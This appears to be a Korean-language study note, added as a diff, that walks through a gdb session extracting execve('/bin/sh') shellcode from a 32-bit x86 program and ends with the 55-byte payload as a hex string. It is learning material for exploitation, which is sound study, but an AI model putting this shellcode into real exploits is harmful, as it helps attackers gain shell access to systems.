@@ -1,0 +1,88 @@
+* shell code 추출
+
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gcc -o asm_shell_x86_intel asm_shell_x86_intel.c -m32 -masm=intel -fno-stack-protector -mpreferred-stack-boundary=2 -static -Wl,--omagic
+guybrush@nt900x5t:~/Project/github/hack/shellcode/step1/x86$ gdb -q asm_shell_x86_intel
+Reading symbols from asm_shell_x86_intel...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804883c <+0>:	push   ebp
+   0x0804883d <+1>:	mov    ebp,esp
+   0x0804883f <+3>:	mov    esi,0x804886f
+   0x08048844 <+8>:	mov    BYTE PTR [esi+0x7],0x0
+   0x08048848 <+12>:	mov    DWORD PTR [esi+0x8],esi
+   0x0804884b <+15>:	mov    DWORD PTR [esi+0xc],0x0
+   0x08048852 <+22>:	mov    eax,0xb
+   0x08048857 <+27>:	mov    ebx,esi
+   0x08048859 <+29>:	lea    ecx,[esi+0x8]
+   0x0804885c <+32>:	mov    edx,0x0
+   0x08048861 <+37>:	int    0x80
+   0x08048863 <+39>:	mov    eax,0x1
+   0x08048868 <+44>:	mov    ebx,0x0
+   0x0804886d <+49>:	int    0x80
+   0x0804886f <+51>:	das    
+   0x08048870 <+52>:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0x08048873 <+55>:	das    
+   0x08048874 <+56>:	jae    0x80488de <generic_start_main+94>
+   0x08048876 <+58>:	add    BYTE PTR [eax-0x6f993ca3],dl
+End of assembler dump.
+
+=> main + 3의 주소 즉, mov esi, 0x804886f가 shell code의 시작주소(0x0804883f) 임을 확인할 수 있다.
+
+=> mov esi, 0x804886f 코드는 label이 설정된 /bin/sh 문자열의 주소를 esi 레지스터에 저장하는 코드이므로, main+8 코드까지 실행한 뒤,
+   esi 레지스터에 /bin/sh 문자열의 주소가 제대로 저장되었는지 확인해 본다.
+
+(gdb) b *main+8
+Breakpoint 1 at 0x8048844
+(gdb) r
+Starting program: /home/guybrush/Project/github/hack/shellcode/step1/x86/asm_shell_x86_intel 
+
+Breakpoint 1, 0x08048844 in main ()
+(gdb) x/s $esi
+0x804886f <main+51>:	"/bin/sh"
+
+=> esi 레지스터에 저장된 주소값 0x0804886f가 /bin/sh 문자열의 주소임을 확인할 수 있다.
+
+=> 정확한 shell code를 얻기 위해서 shell code의 시작주소와 마지막 주소를 확인해야 하는데,
+   시작주소는 mov esi, 0x804886f 코드의 주소인 0x0804883f 임을 확인할 수 있으며,
+   마지막 주소는 assembly 코드에서 /bin/sh의 label을 설정한 코드로써, /bin/sh 문자열의 마지막 h의 주소임을 확인할 수 있다.
+
+=> 시작주소 : 0x0804883f
+=> 마지막 주소 : 0x0804886f(/bin/sh 시작주소) + 6(마지막 문자 h까지의 offset) = 0x08048875 
+
+=> 마지막 주소와 시작주소의 차에 +1을 한 값이 실제 shell code의 size이므로, 아래와 같이 계산해 본다.
+
+(gdb) p/x (0x0804886f - 0x0804883f)
+$1 = 0x30
+
+(gdb) p/x (0x08048875 - 0x0804883f)
+$2 = 0x36
+
+(gdb) p/d 0x36
+$3 = 54
+
+(gdb) p/d (0x08048875 - 0x0804883f)
+$4 = 54
+
+=> shell code의 size는 54 + 1 = 55, 총 55 bytes
+
+=> shell code의 시작주소 0x0804883f로부터 55bytes를 byte 단위로 dump 뜨면 아래와 같다.
+
+(gdb) x/55bx 0x0804883f
+0x804883f <main+3>:	0xbe	0x6f	0x88	0x04	0x08	0xc6	0x46	0x07
+0x8048847 <main+11>:	0x00	0x89	0x76	0x08	0xc7	0x46	0x0c	0x00
+0x804884f <main+19>:	0x00	0x00	0x00	0xb8	0x0b	0x00	0x00	0x00
+0x8048857 <main+27>:	0x89	0xf3	0x8d	0x4e	0x08	0xba	0x00	0x00
+0x804885f <main+35>:	0x00	0x00	0xcd	0x80	0xb8	0x01	0x00	0x00
+0x8048867 <main+43>:	0x00	0xbb	0x00	0x00	0x00	0x00	0xcd	0x80
+0x804886f <main+51>:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68
+(gdb) 
+
+
+
+* shell code bytes - 55 bytes
+\xbe\x6f\x88\x04\x08\xc6\x46\x07\x00\x89\x76\x08\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\xba\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\x2f\x62\x69\x6e\x2f\x73\x68
+
+
+
+
+
